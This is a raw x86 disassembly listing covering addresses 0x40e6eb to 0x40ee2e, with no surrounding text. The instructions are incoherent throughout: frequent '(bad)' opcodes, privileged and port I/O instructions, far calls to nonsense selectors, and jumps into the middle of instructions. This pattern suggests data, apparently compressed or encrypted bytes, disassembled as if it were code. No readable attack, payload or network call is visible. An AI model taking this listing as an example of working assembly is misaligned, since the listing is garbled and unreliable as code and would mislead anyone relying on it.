  40e6eb:	lods   eax,DWORD PTR ds:[esi]
  40e6ec:	test   DWORD PTR [eax+0x22],edi
  40e6ef:	iret   
  40e6f0:	mov    esi,DWORD PTR [edi]
  40e6f2:	dec    ecx
  40e6f3:	mov    BYTE PTR [esp+edx*1],ch
  40e6f6:	add    DWORD PTR [eax-0x67ae893],esi
  40e6fc:	mov    ebx,DWORD PTR [ebx+0x6dbe8fe9]
  40e702:	aas    
  40e703:	pop    eax
  40e704:	fcomp  st(6)
  40e706:	nop
  40e707:	lods   al,BYTE PTR ds:[esi]
  40e708:	test   DWORD PTR [ecx-0x73fb1398],eax
  40e70e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e70f:	mov    ch,0x6e
  40e711:	ins    BYTE PTR es:[edi],dx
  40e712:	cmp    al,0x8c
  40e714:	adc    ebx,DWORD PTR [ebx]
  40e716:	in     al,0xba
  40e718:	xor    eax,0x609abec0
  40e71d:	mov    ebx,0x3f905fb1
  40e722:	aas    
  40e723:	dec    ebx
  40e724:	mov    edi,0xda492f53
  40e729:	lods   eax,DWORD PTR ds:[esi]
  40e72a:	jo     0x40e707
  40e72c:	enter  0x9207,0x44
  40e730:	imul   dh
  40e732:	sbb    eax,0x5b74cda5
  40e737:	pop    edx
  40e738:	push   0xffffffb7
  40e73a:	(bad)  
  40e73b:	mov    eax,0xa45f861d
  40e740:	ja     0x40e720
  40e742:	inc    esp
  40e743:	pop    edx
  40e744:	pop    ss
  40e745:	or     eax,0x2316a
  40e74a:	popf   
  40e74b:	clc    
  40e74c:	push   esp
  40e74d:	or     BYTE PTR [eax-0x26],bl
  40e750:	jp     0x40e74b
  40e752:	mov    esp,0xdb6e0c1a
  40e757:	mov    dh,0xb5
  40e759:	pop    edi
  40e75a:	push   eax
  40e75b:	or     ah,BYTE PTR [esi+0x65]
  40e75e:	xchg   DWORD PTR [ecx],edx
  40e760:	mov    bh,BYTE PTR [eax]
  40e762:	call   0xbd4:0xb0b6edb3
  40e769:	add    dl,BYTE PTR [edx-0x6413d08a]
  40e76f:	push   cs
  40e770:	sbb    ch,BYTE PTR [eax+0x7b02e88e]
  40e776:	test   al,0xca
  40e778:	lahf   
  40e779:	add    eax,0x50b6db6c
  40e77e:	(bad)  
  40e780:	repnz push 0x3238d7be
  40e786:	inc    ebp
  40e787:	push   ebx
  40e788:	mov    ah,0x51
  40e78a:	sub    eax,0x868e2c04
  40e78f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e790:	mov    al,0xb5
  40e792:	in     eax,dx
  40e793:	push   edx
  40e794:	lahf   
  40e795:	sbb    bl,0xad
  40e798:	mov    dh,0x19
  40e79a:	mov    eax,ds:0xb1ba8d50
  40e79f:	mov    cl,0xb0
  40e7a1:	int    0xfb
  40e7a3:	jl     0x40e7ab
  40e7a5:	inc    ebp
  40e7a6:	dec    esp
  40e7a7:	mov    ds:0x970a92e8,al
  40e7ac:	call   0xe34f:0x8fb9b200
  40e7b3:	jl     0x40e790
  40e7b5:	xchg   esi,eax
  40e7b6:	xchg   esi,eax
  40e7b7:	push   ss
  40e7b8:	mov    gs,esi
  40e7ba:	xchg   BYTE PTR [edi-0x3582353],ch
  40e7c0:	adc    DWORD PTR [ebx],ebx
  40e7c2:	or     BYTE PTR ds:0x993c5862,0xa8
  40e7c9:	adc    esp,ecx
  40e7cb:	inc    edi
  40e7cc:	adc    al,0xcb
  40e7ce:	push   ss
  40e7cf:	aad    0xe2
  40e7d1:	push   ecx
  40e7d2:	out    0x2c,al
  40e7d4:	mov    ah,0x1b
  40e7d6:	pop    ebx
  40e7d7:	inc    edi
  40e7d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7d9:	cld    
  40e7da:	arpl   WORD PTR [ecx-0x49bc3745],dx
  40e7e0:	pop    ss
  40e7e1:	ss sahf 
  40e7e3:	outs   dx,BYTE PTR ds:[esi]
  40e7e4:	cld    
  40e7e5:	sbb    BYTE PTR [edx+eiz*2+0x17],ah
  40e7e9:	inc    edx
  40e7ea:	(bad)  
  40e7eb:	jns    0x40e852
  40e7ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7ee:	mov    al,0xd1
  40e7f0:	jbe    0x40e832
  40e7f2:	sbb    DWORD PTR [esi],edi
  40e7f4:	lea    ecx,[esi]
  40e7f6:	adc    eax,0xd5cddaa1
  40e7fb:	mov    dh,0xe2
  40e7fd:	in     al,dx
  40e7fe:	fwait
  40e7ff:	push   0x54190b95
  40e804:	or     BYTE PTR [esi-0x2e8aecb],dh
  40e80a:	fcmove st,st(7)
  40e80c:	ror    dh,1
  40e80e:	lds    ebx,FWORD PTR [esi-0xb]
  40e811:	cmp    ah,BYTE PTR [edx]
  40e813:	loopne 0x40e7db
  40e815:	adc    DWORD PTR [ecx+0x3c],0xdb07c6d8
  40e81c:	mov    dh,0x55
  40e81e:	add    dl,al
  40e820:	cli    
  40e821:	std    
  40e822:	jp     0x40e859
  40e824:	inc    edi
  40e825:	mov    ebx,DWORD PTR [ebx+0x1b]
  40e828:	cmp    esp,DWORD PTR [edx-0x557a5dd7]
  40e82e:	(bad)  
  40e82f:	repnz retf 0xbca3
  40e833:	(bad)  [eax+0x6b]
  40e836:	das    
  40e837:	mov    edi,0xdca6a307
  40e83c:	xor    eax,0xadbd0055
  40e841:	fstp   QWORD PTR [edx]
  40e843:	mov    cl,0x41
  40e845:	enter  0x469e,0xbc
  40e849:	bound  edx,QWORD PTR [eax-0x26]
  40e84c:	or     bl,bl
  40e84e:	test   DWORD PTR [ebp+0x6a],esi
  40e851:	lods   eax,DWORD PTR ds:[esi]
  40e852:	xor    DWORD PTR [eax],edi
  40e854:	bound  ebx,QWORD PTR [ebx+0x41]
  40e857:	popf   
  40e858:	test   eax,0x895b6b75
  40e85d:	jmp    0x40e86a
  40e85f:	je     0x40e892
  40e861:	xor    al,0x60
  40e863:	mov    BYTE PTR [edi+0x42b6d0b6],ah
  40e869:	push   eax
  40e86a:	das    
  40e86b:	inc    ebx
  40e86c:	add    al,0x13
  40e86e:	jl     0x40e802
  40e870:	popa   
  40e871:	mov    ds:0x3475fcb4,eax
  40e876:	add    BYTE PTR [edi-0x6661bf6b],dh
  40e87c:	jge    0x40e8d6
  40e87e:	mov    dh,0x35
  40e880:	les    esi,FWORD PTR [esi-0x4b]
  40e883:	out    dx,eax
  40e884:	mov    eax,ds:0xd7955aa1
  40e889:	shr    DWORD PTR [edi],0xb0
  40e88c:	ins    BYTE PTR es:[edi],dx
  40e88d:	xchg   esp,eax
  40e88e:	in     eax,dx
  40e88f:	push   0x8a41cbf7
  40e894:	xchg   ecx,eax
  40e895:	daa    
  40e896:	pop    ebx
  40e897:	in     eax,dx
  40e898:	mov    dh,0xb0
  40e89a:	scas   eax,DWORD PTR es:[edi]
  40e89b:	or     esp,ebx
  40e89d:	les    edx,FWORD PTR [eax+0x6c]
  40e8a0:	mov    cl,0xe3
  40e8a2:	pop    ds
  40e8a3:	adc    bl,BYTE PTR [ebx-0x28]
  40e8a6:	(bad)  
  40e8a8:	add    DWORD PTR [eax],eax
  40e8aa:	mov    ecx,fs
  40e8ac:	outs   dx,BYTE PTR ds:[esi]
  40e8ad:	ret    0x2b50
  40e8b0:	and    eax,0xda361d8a
  40e8b5:	mov    dh,0x71
  40e8b7:	ins    DWORD PTR es:[edi],dx
  40e8b8:	mov    edx,0xd6b2c27
  40e8bd:	mov    bl,0x2d
  40e8bf:	out    dx,al
  40e8c0:	mov    al,0x5d
  40e8c2:	pop    eax
  40e8c3:	fmul   DWORD PTR [esi]
  40e8c5:	cmc    
  40e8c6:	add    al,0x52
  40e8c8:	fs iret 
  40e8ca:	pop    esp
  40e8cb:	lds    esi,FWORD PTR [eax-0x1b]
  40e8ce:	mov    edi,0x18f915d1
  40e8d3:	or     ebp,0x92e70074
  40e8d9:	add    dh,al
  40e8db:	jmp    0x290e:0x6c6edb40
  40e8e2:	adc    bh,BYTE PTR [ebx-0x4c]
  40e8e5:	es call 0xed8c55b9
  40e8eb:	mov    dh,0x0
  40e8ed:	ret    0x5786
  40e8f0:	mov    DWORD PTR cs:[edi-0x3b],eax
  40e8f4:	add    eax,0x54b1ada1
  40e8f9:	sub    bl,bh
  40e8fb:	inc    eax
  40e8fc:	push   esi
  40e8fd:	enter  0x2f06,0x58
  40e901:	fdiv   DWORD PTR [esi-0x43442553]
  40e907:	jecxz  0x40e890
  40e909:	xchg   BYTE PTR [eax],dl
  40e90b:	mov    al,ds:0x6b6a0d99
  40e910:	pop    esp
  40e911:	pop    ebx
  40e912:	out    dx,eax
  40e913:	ins    DWORD PTR es:[edi],dx
  40e914:	jb     0x40e960
  40e916:	(bad)  
  40e917:	cmp    BYTE PTR [esi-0x3db4912c],dh
  40e91d:	jae    0x40e8e7
  40e91f:	xchg   ebx,eax
  40e920:	aaa    
  40e921:	add    eax,0xdbd78efe
  40e926:	rol    dl,cl
  40e928:	(bad)  
  40e929:	lods   eax,DWORD PTR ds:[esi]
  40e92a:	inc    edx
  40e92b:	and    BYTE PTR [ebp+0x1d],dl
  40e92e:	sbb    cl,BYTE PTR [esi]
  40e930:	out    0xd9,al
  40e932:	shr    DWORD PTR [esi+0x14],1
  40e935:	outs   dx,BYTE PTR ds:[esi]
  40e936:	cmp    ah,bh
  40e938:	jmp    0x40e8cb
  40e93a:	push   ds
  40e93b:	xchg   edi,eax
  40e93c:	std    
  40e93d:	sub    BYTE PTR [edi-0x4c],0x5b
  40e941:	mov    ebx,0x2651d29c
  40e946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e947:	pop    esi
  40e948:	pop    esi
  40e949:	enter  0xe4de,0xa0
  40e94d:	add    BYTE PTR [ebp+0x17],bh
  40e950:	ss xchg esi,eax
  40e952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e953:	test   BYTE PTR [edx],dl
  40e955:	call   0xf638daa9
  40e95a:	lea    ebx,[ebx+0x6d]
  40e95d:	fnstcw WORD PTR [eax+0x4827458c]
  40e963:	pushf  
  40e964:	out    dx,al
  40e965:	cwde   
  40e966:	xor    al,0x5c
  40e968:	test   DWORD PTR [ebp-0x727c7dda],eax
  40e96e:	sbb    ebp,DWORD PTR [ecx+0x23b0c1d1]
  40e974:	clc    
  40e975:	(bad)  
  40e976:	aam    0xd
  40e978:	xor    esp,ebx
  40e97a:	jp     0x40e9bc
  40e97c:	aad    0x14
  40e97e:	ins    DWORD PTR es:[edi],dx
  40e97f:	sbb    ebp,DWORD PTR [ebp+0x57]
  40e982:	(bad)  
  40e983:	push   cs
  40e984:	mov    bl,0xe3
  40e986:	xchg   esi,eax
  40e987:	test   al,0x2c
  40e989:	mov    esp,0xb6ed4428
  40e98e:	dec    edx
  40e98f:	rcr    DWORD PTR [edi-0x55],1
  40e992:	sbb    DWORD PTR [esp+eax*1-0x1939247b],esp
  40e999:	aas    
  40e99a:	je     0x40ea11
  40e99c:	ss test dh,0x3
  40e9a0:	(bad)  
  40e9a1:	(bad)  
  40e9a2:	das    
  40e9a3:	ins    BYTE PTR es:[edi],dx
  40e9a4:	test   DWORD PTR [ebx],ecx
  40e9a6:	mov    ch,0x5b
  40e9a8:	lock jae 0x40e99d
  40e9ab:	cmp    DWORD PTR [ecx+0x7b],esp
  40e9ae:	out    dx,al
  40e9af:	add    BYTE PTR [ebx-0x28],bl
  40e9b2:	push   ss
  40e9b3:	xchg   esi,eax
  40e9b4:	lods   al,BYTE PTR ds:[esi]
  40e9b5:	pusha  
  40e9b6:	int    0xf
  40e9b8:	iret   
  40e9b9:	fild   DWORD PTR [edi]
  40e9bb:	in     eax,dx
  40e9bc:	sub    DWORD PTR [eax-0x1f9ead7b],esp
  40e9c2:	mov    esi,0x5619102a
  40e9c7:	sub    BYTE PTR [ebp-0x15],0xdf
  40e9cb:	adc    al,0xbc
  40e9cd:	mov    BYTE PTR ds:0x9d1dc77,bl
  40e9d3:	mov    bh,0x95
  40e9d5:	in     eax,dx
  40e9d6:	mov    dh,0xb7
  40e9d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9d9:	jno    0x40ea49
  40e9db:	sbb    eax,0x42d66474
  40e9e0:	adc    esi,DWORD PTR [ebx+eiz*1-0x6a]
  40e9e4:	jmp    FWORD PTR [ecx-0x2962d32d]
  40e9ea:	shl    DWORD PTR [esi-0x1341bb13],1
  40e9f0:	xchg   DWORD PTR [ebx],edi
  40e9f2:	mov    ah,0xd1
  40e9f4:	sub    bh,dl
  40e9f6:	mov    edi,0xad896dc0
  40e9fb:	jae    0x40e98f
  40e9fd:	or     eax,0xc8a07dcb
  40ea02:	fimul  DWORD PTR [edi-0x2abbe292]
  40ea08:	mov    esp,0x9dfd9761
  40ea0d:	leave  
  40ea0e:	jge    0x40e9c4
  40ea10:	pop    ebx
  40ea11:	pop    ebx
  40ea12:	mov    ds:0x5da2d70,al
  40ea17:	retf   0x2973
  40ea1a:	imul   edx,DWORD PTR [edi],0x14366850
  40ea20:	pop    edx
  40ea21:	xchg   esi,eax
  40ea22:	and    al,0x2c
  40ea24:	xchg   edi,eax
  40ea25:	sbb    ch,BYTE PTR [eax+0x3749535b]
  40ea2b:	jb     0x40e9bd
  40ea2d:	gs pop esi
  40ea2f:	mov    ch,0x85
  40ea31:	(bad)  
  40ea32:	mov    dh,0x6d
  40ea34:	pop    esp
  40ea35:	cmp    ch,BYTE PTR [edx-0x4edfca68]
  40ea3b:	les    esi,FWORD PTR [eax-0x25]
  40ea3e:	fdiv   DWORD PTR [esi-0x55a197c3]
  40ea44:	cmp    edx,DWORD PTR [ecx-0x74]
  40ea47:	repnz sub eax,0xb0bb46bb
  40ea4d:	cmp    eax,0xa0cb2457
  40ea52:	push   edx
  40ea53:	sub    BYTE PTR ds:0xb2e037d,ah
  40ea59:	fcmovnb st,st(6)
  40ea5b:	ss ss jns 0x40eabb
  40ea5f:	popa   
  40ea60:	xchg   edi,eax
  40ea61:	cmp    eax,0x42ededd7
  40ea66:	mov    ebx,0x6fbf46b5
  40ea6b:	inc    esi
  40ea6c:	cmc    
  40ea6d:	and    eax,0x16860cb0
  40ea72:	sbb    bl,BYTE PTR [ebx+0x312746aa]
  40ea78:	push   ds
  40ea79:	daa    
  40ea7a:	or     eax,0xadb6da20
  40ea7f:	(bad)  [edi]
  40ea81:	ret    
  40ea82:	jle    0x40eabf
  40ea84:	mov    dh,0x7
  40ea86:	sbb    cl,BYTE PTR [ebp+0x5c51e165]
  40ea8c:	pop    eax
  40ea8d:	pop    eax
  40ea8e:	jp     0x40ea85
  40ea90:	fs dec edi
  40ea92:	pop    es
  40ea93:	clc    
  40ea94:	sbb    ebx,DWORD PTR [ebx-0x45]
  40ea97:	mov    ch,0x5d
  40ea99:	sti    
  40ea9a:	sar    ecx,cl
  40ea9c:	push   0x5351db1d
  40eaa1:	pop    ecx
  40eaa2:	cs mov ebx,0xdb1bb6d5
  40eaa8:	(bad)
  40eaab:	push   ebp
  40eaac:	and    edi,DWORD PTR [eax+0x6d2ceae9]
  40eab2:	mov    ch,0x5b
  40eab4:	pop    ebx
  40eab5:	adc    al,0x4b
  40eab7:	mov    esp,eax
  40eab9:	dec    edx
  40eaba:	test   eax,0x6a8671cd
  40eabf:	mov    ebx,0x29701db4
  40eac4:	xchg   BYTE PTR [esi+0x17],bl
  40eac7:	imul   esi,edx,0xa5c6b6b7
  40eacd:	rcr    DWORD PTR [ecx+0x1e],0xd6
  40ead1:	mov    ds:0x5958fa50,al
  40ead6:	fistp  WORD PTR [ebp-0x26]
  40ead9:	fcomp  DWORD PTR [edx]
  40eadb:	jnp    0x40ea9f
  40eadd:	ret    
  40eade:	test   BYTE PTR [edx+esi*1-0x3abb719a],dl
  40eae5:	ins    DWORD PTR es:[edi],dx
  40eae6:	mov    eax,ds:0x5fe6108c
  40eaeb:	mov    ds:0x5bb602d8,eax
  40eaf0:	fild   DWORD PTR [eax]
  40eaf2:	mov    ebx,0xb59b416c
  40eaf7:	outs   dx,BYTE PTR ds:[esi]
  40eaf8:	repnz and eax,0x60a36d11
  40eafe:	pop    es
  40eaff:	mov    bl,0x99
  40eb01:	dec    edi
  40eb02:	mov    bl,0x37
  40eb04:	fisub  DWORD PTR [ebp-0x55]
  40eb07:	clc    
  40eb08:	popa   
  40eb09:	jp     0x40eb4d
  40eb0b:	jb     0x40eb30
  40eb0d:	push   edi
  40eb0e:	(bad)  [ecx-0x53]
  40eb11:	pop    ebp
  40eb12:	push   0xb
  40eb14:	add    ebp,ebx
  40eb16:	(bad)  
  40eb17:	clc    
  40eb18:	fisubr WORD PTR [ebp+0x7d]
  40eb1b:	pop    edi
  40eb1c:	ins    DWORD PTR es:[edi],dx
  40eb1d:	fild   DWORD PTR [ecx-0x49]
  40eb20:	jno    0x40eab1
  40eb22:	test   al,0x7e
  40eb24:	jg     0x40eb06
  40eb26:	cmp    ah,BYTE PTR [ebp+0x22]
  40eb29:	and    BYTE PTR [ebp+0x4b],al
  40eb2c:	sbb    ebx,DWORD PTR [ebx]
  40eb2e:	inc    ebp
  40eb2f:	mov    dl,BYTE PTR [ebx-0x4976be1e]
  40eb35:	scas   al,BYTE PTR es:[edi]
  40eb36:	ins    DWORD PTR es:[edi],dx
  40eb37:	mov    eax,ds:0x5627315c
  40eb3c:	out    0xfa,eax
  40eb3e:	pop    edi
  40eb3f:	je     0x40eb93
  40eb41:	imul   ebx,ebx,0xffffffd8
  40eb44:	push   ss
  40eb45:	cmp    BYTE PTR [edx+0x26],0x26
  40eb49:	daa    
  40eb4a:	clc    
  40eb4b:	jge    0x40eb10
  40eb4d:	mov    eax,0x52ed6eda
  40eb52:	adc    al,0x4c
  40eb54:	enter  0x6ba7,0xe2
  40eb58:	xchg   edi,eax
  40eb59:	adc    BYTE PTR [eax+0x50b6d2d2],0x89
  40eb60:	dec    edi
  40eb61:	mov    edx,0x32836f0e
  40eb66:	push   cs
  40eb67:	test   DWORD PTR [ebp+0x4267ed05],ebp
  40eb6d:	xlat   BYTE PTR ds:[ebx]
  40eb6e:	or     bl,BYTE PTR [ecx+0x31]
  40eb71:	add    DWORD PTR [ecx],ecx
  40eb73:	sub    dl,BYTE PTR [esi+esi*4]
  40eb76:	fwait
  40eb77:	(bad)  
  40eb78:	xchg   edx,eax
  40eb79:	rol    DWORD PTR [ecx-0x5a383958],cl
  40eb7f:	mov    dh,0xa6
  40eb81:	xchg   ecx,eax
  40eb82:	adc    DWORD PTR [ebx],esp
  40eb84:	jb     0x40ebf2
  40eb86:	stos   DWORD PTR es:[edi],eax
  40eb87:	pop    edi
  40eb88:	mov    BYTE PTR [ebx+ebx*8+0x6],0xe0
  40eb8d:	add    DWORD PTR [ecx+esi*4],0x1777a861
  40eb94:	mov    edx,0x8d746db1
  40eb99:	mov    ds:0x7b741015,eax
  40eb9e:	pop    edx
  40eb9f:	(bad)  
  40eba0:	outs   dx,DWORD PTR ds:[esi]
  40eba1:	(bad)  
  40eba2:	int    0xd4
  40eba4:	push   esi
  40eba5:	aam    0x8f
  40eba7:	ins    BYTE PTR es:[edi],dx
  40eba8:	lea    edx,[ecx]
  40ebaa:	pop    ebp
  40ebab:	sbb    BYTE PTR [esi],al
  40ebad:	xchg   edi,eax
  40ebae:	push   ss
  40ebaf:	mov    dh,0x4a
  40ebb1:	cmp    DWORD PTR [edx],0xffffffe2
  40ebb4:	push   es
  40ebb5:	imul   ebx,DWORD PTR [edx-0x2524ca7b],0xffffffad
  40ebbc:	test   edi,eax
  40ebbe:	mov    al,ds:0xb63699a0
  40ebc3:	mov    edi,0x80950b65
  40ebc8:	lea    ebp,[ebp-0x1d]
  40ebcb:	pop    edi
  40ebcc:	jno    0x40ec04
  40ebce:	stos   DWORD PTR es:[edi],eax
  40ebcf:	xor    DWORD PTR [eax-0x49],ebp
  40ebd2:	ins    DWORD PTR es:[edi],dx
  40ebd3:	leave  
  40ebd4:	push   eax
  40ebd5:	jno    0x40ec0f
  40ebd7:	xlat   BYTE PTR ds:[ebx]
  40ebd8:	sbb    DWORD PTR [edi+0x3c],0x51
  40ebdc:	gs ins DWORD PTR es:[edi],dx
  40ebde:	fld    TBYTE PTR [ebp-0x25]
  40ebe1:	imul   edx,ecx,0x281d72a1
  40ebe7:	sahf   
  40ebe8:	stos   BYTE PTR es:[edi],al
  40ebe9:	scas   eax,DWORD PTR es:[edi]
  40ebea:	mov    dh,0x28
  40ebec:	add    BYTE PTR [ebx+0x6d],bl
  40ebef:	pop    es
  40ebf0:	xchg   esp,eax
  40ebf1:	pop    ds
  40ebf2:	jns    0x40ec32
  40ebf4:	xchg   esp,eax
  40ebf5:	jne    0x40ebd1
  40ebf7:	pop    eax
  40ebf8:	fsubr  DWORD PTR [edx+0x8]
  40ebfb:	or     ch,BYTE PTR [ebx+0x6d]
  40ebfe:	hlt    
  40ebff:	mov    bh,0xb8
  40ec01:	lods   eax,DWORD PTR ds:[esi]
  40ec02:	je     0x40ec6d
  40ec04:	pop    ebx
  40ec05:	push   esi
  40ec06:	sub    DWORD PTR [eax+0x3f],ebp
  40ec09:	adc    DWORD PTR [ebp+ecx*8-0x74],eax
  40ec0d:	pop    esp
  40ec0e:	popa   
  40ec0f:	imul   esp,DWORD PTR [ebx-0x75],0xe4040ccd
  40ec16:	cwde   
  40ec17:	add    eax,0x6f2e88b4
  40ec1c:	jno    0x40ec89
  40ec1e:	and    eax,0xc9f033fa
  40ec23:	jge    0x40ec25
  40ec25:	inc    eax
  40ec26:	or     al,dl
  40ec28:	xchg   esp,eax
  40ec29:	ins    DWORD PTR es:[edi],dx
  40ec2a:	mov    ebx,0x33714835
  40ec2f:	add    DWORD PTR [esi],edi
  40ec31:	dec    ecx
  40ec32:	fcmovu st,st(0)
  40ec34:	mov    ah,0xdb
  40ec36:	(bad)  
  40ec37:	outs   dx,BYTE PTR ds:[esi]
  40ec38:	mov    bh,0x19
  40ec3a:	not    BYTE PTR [edi]
  40ec3c:	push   eax
  40ec3d:	clc    
  40ec3e:	je     0x40ec35
  40ec40:	jmp    0xa68c71cb
  40ec45:	inc    edx
  40ec46:	mov    ebp,0x7c7e5f35
  40ec4b:	popa   
  40ec4c:	in     eax,dx
  40ec4d:	xor    BYTE PTR [esi-0x33e3d7f5],0xbf
  40ec54:	jmp    0x8d6c8e72
  40ec59:	jbe    0x40ebfe
  40ec5b:	mov    cl,0x1d
  40ec5d:	loope  0x40ec80
  40ec5f:	cdq    
  40ec60:	inc    ebp
  40ec61:	sbb    al,cl
  40ec63:	cmovge eax,ebp
  40ec66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec67:	lea    eax,[ecx]
  40ec69:	lock js 0x40ecce
  40ec6c:	xchg   BYTE PTR [edx],cl
  40ec6e:	pop    eax
  40ec6f:	jl     0x40ec4c
  40ec71:	push   ecx
  40ec72:	sbb    eax,0xb371beb4
  40ec77:	mov    ecx,0x7a8d3924
  40ec7c:	cs ins BYTE PTR es:[edi],dx
  40ec7e:	mov    ah,0x5b
  40ec80:	or     BYTE PTR [esi+0x63999ed2],ch
  40ec86:	sub    ebp,eax
  40ec88:	push   0x2eb71f8
  40ec8d:	(bad)  
  40ec8e:	ficomp WORD PTR [esp+edx*1-0x12]
  40ec92:	dec    ebx
  40ec93:	sub    DWORD PTR [ebx+0x6a],ebx
  40ec96:	fisttp DWORD PTR [esi]
  40ec98:	(bad)  
  40ec9a:	rol    DWORD PTR [ebp+0x392fe2ea],cl
  40eca0:	pop    ecx
  40eca1:	int    0x17
  40eca3:	push   0xffffffdc
  40eca5:	push   ss
  40eca6:	in     eax,0x77
  40eca8:	mov    ah,0x1a
  40ecaa:	xor    eax,0x1e6d00dc
  40ecaf:	pop    ebx
  40ecb0:	fcmovnu st,st(0)
  40ecb2:	add    DWORD PTR ds:0xd7d29dbc,edx
  40ecb8:	mov    dh,0x62
  40ecba:	gs mov dh,0x2
  40ecbd:	mov    cl,0xb5
  40ecbf:	cmp    DWORD PTR ds:[esi+edx*4+0x16cea7af],0xffffffb6
  40ecc8:	in     eax,0x17
  40ecca:	out    dx,al
  40eccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eccc:	mov    dl,0x0
  40ecce:	mov    DWORD PTR [edx+0x40fb9b07],ecx
  40ecd4:	mov    ch,0xb6
  40ecd6:	lock ins DWORD PTR es:[edi],dx
  40ecd8:	aas    
  40ecd9:	adc    eax,0xfd59da5e
  40ecde:	in     al,dx
  40ecdf:	jg     0x40ed36
  40ece1:	pusha  
  40ece2:	and    BYTE PTR [ebx+ecx*1-0x6cf61e93],dh
  40ece9:	out    dx,al
  40ecea:	mov    eax,ds:0x1ac6b241
  40ecef:	bound  ebx,QWORD PTR [edx-0x18]
  40ecf2:	add    BYTE PTR [esi],ch
  40ecf4:	aaa    
  40ecf5:	out    0x7b,eax
  40ecf7:	or     dh,ah
  40ecf9:	mov    es,eax
  40ecfb:	pop    edi
  40ecfc:	sbb    eax,DWORD PTR [ecx+0x3]
  40ecff:	loop   0x40ed08
  40ed01:	call   DWORD PTR [edi+ebx*8+0x1b4b89e3]
  40ed08:	and    al,0xa5
  40ed0a:	pop    ss
  40ed0b:	ins    WORD PTR es:[edi],dx
  40ed0d:	hlt    
  40ed0e:	stos   BYTE PTR es:[edi],al
  40ed0f:	push   ecx
  40ed10:	pop    eax
  40ed11:	fdiv   DWORD PTR [esi+0x1d65416d]
  40ed17:	sbb    eax,0xf1ae4a87
  40ed1c:	push   cs
  40ed1d:	sub    al,0x95
  40ed1f:	mov    al,ds:0x1dfa12dd
  40ed24:	shl    DWORD PTR ds:0xadb70408,1
  40ed2a:	adc    BYTE PTR [eax+edx*1],ch
  40ed2d:	je     0x40ecc1
  40ed2f:	push   eax
  40ed30:	out    dx,al
  40ed31:	sti    
  40ed32:	or     eax,0x346db16c
  40ed37:	inc    ecx
  40ed38:	js     0x40ed94
  40ed3a:	mov    edx,0xed07b69e
  40ed3f:	mov    dl,0xb6
  40ed42:	pop    edx
  40ed43:	push   ds
  40ed44:	sub    ebp,esi
  40ed46:	mov    al,ds:0x497a595
  40ed4b:	inc    esp
  40ed4c:	sub    eax,0x13b6d56d
  40ed51:	or     BYTE PTR [ebp+0x686a1a9b],ch
  40ed57:	or     ecx,DWORD PTR [ebp-0xa493d13]
  40ed5d:	and    bl,BYTE PTR [eax+edi*2-0x12]
  40ed61:	and    esi,esp
  40ed63:	pop    edi
  40ed64:	les    ecx,FWORD PTR [ecx]
  40ed66:	push   esi
  40ed67:	fisubr DWORD PTR [esi+0xb]
  40ed6a:	sbb    al,0xb3
  40ed6c:	pop    ss
  40ed6d:	lahf   
  40ed6e:	rcl    esp,0xf2
  40ed71:	cmc    
  40ed72:	xlat   BYTE PTR ds:[ebx]
  40ed73:	outs   dx,BYTE PTR ds:[esi]
  40ed74:	xchg   ebp,eax
  40ed75:	outs   dx,BYTE PTR ds:[esi]
  40ed76:	in     eax,dx
  40ed77:	pop    ds
  40ed78:	cmovp  edi,DWORD PTR [ebx]
  40ed7b:	jne    0x40edf3
  40ed7d:	je     0x40ed64
  40ed7f:	fmul   DWORD PTR [edi-0x2587a7a5]
  40ed85:	retf   
  40ed86:	iret   
  40ed87:	jp     0x40ee08
  40ed89:	popa   
  40ed8a:	lock cmp eax,0xea29a0
  40ed90:	xchg   esi,eax
  40ed91:	push   0xffffffde
  40ed93:	adc    BYTE PTR ds:0x76c65c68,0x5b
  40ed9a:	fcomp  DWORD PTR [edx+0x6bd9526d]
  40eda0:	mov    BYTE PTR [ecx+edx*1-0x249c7e40],cl
  40eda7:	fcmovbe st,st(2)
  40eda9:	xor    BYTE PTR [ecx+0x28],bl
  40edac:	pop    esp
  40edad:	out    dx,eax
  40edae:	test   BYTE PTR [edi-0x73],al
  40edb1:	inc    ebp
  40edb2:	pop    edx
  40edb3:	pop    eax
  40edb4:	push   0x61
  40edb6:	pop    ebp
  40edb7:	int    0x76
  40edb9:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40edbb:	dec    edi
  40edbc:	enter  0xa095,0x2d
  40edc0:	mov    dh,0x44
  40edc2:	das    
  40edc3:	daa    
  40edc4:	mov    edi,0x35b1b063
  40edc9:	xlat   BYTE PTR cs:[ebx]
  40edcb:	imul   esi,DWORD PTR [ecx+eiz*1],0xffffffec
  40edcf:	add    eax,0xc2c6ea3f
  40edd4:	inc    edx
  40edd5:	mov    ebx,0xe963cd04
  40edda:	push   ebp
  40eddb:	xchg   ecx,eax
  40eddc:	jae    0x40ee29
  40edde:	lahf   
  40eddf:	arpl   WORD PTR [ebx-0x7b31a4b],di
  40ede5:	dec    edx
  40ede6:	sub    DWORD PTR [edi-0x7f9447d6],ecx
  40edec:	sbb    eax,edx
  40edee:	ret    0x56c2
  40edf1:	pop    eax
  40edf2:	jns    0x40edfe
  40edf4:	aaa    
  40edf5:	int    0xab
  40edf7:	call   0x4809:0xc6db4bb6
  40edfe:	pop    ebx
  40edff:	xor    eax,0x3d6777df
  40ee04:	mov    WORD PTR [eax-0x2492f44a],fs
  40ee0a:	cwde   
  40ee0b:	lock ds or eax,0x5f820726
  40ee12:	ds pop ebp
  40ee14:	fist   DWORD PTR [edx-0x45]
  40ee17:	adc    eax,0x52a6aa79
  40ee1c:	sti    
  40ee1d:	mov    al,0xd7
  40ee1f:	jp     0x40eda8
  40ee21:	dec    edi
  40ee22:	fst    QWORD PTR [esi]
  40ee24:	pop    esp
  40ee25:	inc    esi
  40ee26:	pop    es
  40ee27:	jo     0x40ee67
  40ee29:	xchg   esp,eax
  40ee2a:	mov    dl,0xbd
  40ee2c:	ret    
  40ee2d:	(bad)  
  40ee2e:	(bad)  
